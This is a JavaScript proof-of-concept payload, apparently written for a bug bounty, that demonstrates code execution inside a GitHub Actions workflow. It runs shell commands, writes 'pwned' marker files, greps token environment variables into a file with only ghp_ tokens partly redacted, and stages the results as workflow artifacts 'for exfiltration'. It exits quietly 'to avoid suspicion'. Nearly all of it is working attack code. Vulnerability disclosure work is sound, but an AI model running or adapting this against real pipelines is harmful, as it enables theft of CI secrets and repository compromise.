// PoC Injection: RCE proof for bug bounty demonstration
import { execSync } from "node:child_process";

console.log("🔥 Executing RCE proof for bug bounty demonstration 🔥");

// Step 1: Identify environment
console.log("== Environment Information ==");
const hostname = execSync('hostname').toString().trim();
const whoami = execSync('whoami').toString().trim();
console.log(`Running as user: ${whoami} on host: ${hostname}`);

// Step 2: Write proof files
console.log("== Creating proof files ==");
execSync('echo "SYSTEM COMPROMISED VIA GITHUB ACTIONS WORKFLOW" > /tmp/pwned.txt');
execSync('echo "This is a proof of concept for a remote code execution vulnerability" >> /tmp/pwned.txt');
execSync('echo "Timestamp: $(date)" >> /tmp/pwned.txt');

// Step 3: Exfiltrate sensitive environment data (TOKEN REDACTED IN REAL EXPLOIT)
console.log("== Collecting token proof (partial/redacted) ==");
execSync('env | grep -i token | sed "s/\\(ghp_\\)[a-zA-Z0-9]\\{36\\}/\\1REDACTED/g" > /tmp/token_proof.txt');
execSync('echo "GitHub workspace: $GITHUB_WORKSPACE" >> /tmp/token_proof.txt');
execSync('echo "GitHub ref: $GITHUB_REF" >> /tmp/token_proof.txt');

// Step 4: Prepare artifact directory
console.log("== Preparing artifacts for exfiltration ==");
execSync('mkdir -p $GITHUB_WORKSPACE/artifacts');
execSync('cp /tmp/pwned.txt $GITHUB_WORKSPACE/artifacts/');
execSync('cp /tmp/token_proof.txt $GITHUB_WORKSPACE/artifacts/');

// Add a file showing what commands could be run with these permissions
execSync('echo "=== Commands that could be executed with these permissions ===" > $GITHUB_WORKSPACE/artifacts/potential_commands.txt');
execSync('echo "1. git push to protected branches" >> $GITHUB_WORKSPACE/artifacts/potential_commands.txt');
execSync('echo "2. Access to repository secrets" >> $GITHUB_WORKSPACE/artifacts/potential_commands.txt');
execSync('echo "3. Modify workflows" >> $GITHUB_WORKSPACE/artifacts/potential_commands.txt');
execSync('echo "4. Create privileged tokens" >> $GITHUB_WORKSPACE/artifacts/potential_commands.txt');

console.log("✅ RCE proof completed successfully");
console.log("⚠️ In a real attack, this script could:");
console.log("  - Push malicious code to protected branches");
console.log("  - Access and exfiltrate all repository secrets");
console.log("  - Modify workflows and create backdoors");
console.log("  - Compromise the entire CI/CD pipeline");

// Exit successfully to avoid suspicion
process.exit(0);
